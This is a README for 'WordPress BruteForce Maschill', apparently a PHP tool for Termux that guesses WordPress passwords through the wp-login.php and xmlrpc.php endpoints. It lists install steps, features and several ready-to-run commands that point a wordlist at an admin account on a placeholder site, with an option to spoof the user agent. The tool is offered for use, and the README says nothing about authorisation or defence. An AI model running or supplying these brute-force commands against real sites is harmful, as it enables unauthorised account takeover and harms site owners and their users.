# WordPress BruteForce Maschill

Install Requirement
-------------------
``` bash
pkg install php
```

Features
--------
* Standard mode or xmlrpc brute force mode
* Standard mode or wp-login brute force mode
* http and https protocols supported
* Custom HTTP USER AGENT

Usage
-----
* No Wordlist
``` bash
php wp -t https://site.com -u admin -p admin
```
* Using Wordlist
``` bash
php wp -t https://site.com/wp-login.php -u admin -l list.txt
```
* Using Wordlist
``` bash
php wp -t https://site.com/xmlrpc.php -u admin -l list.txt
```

* Custom User Agent
``` bash
php wp -t https://site.com/wp-login.php -u admin -l list.txt -g="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15"
```
For use the standar mode or xmlrpc mode, this tool auto detect your want brute force mode in url target.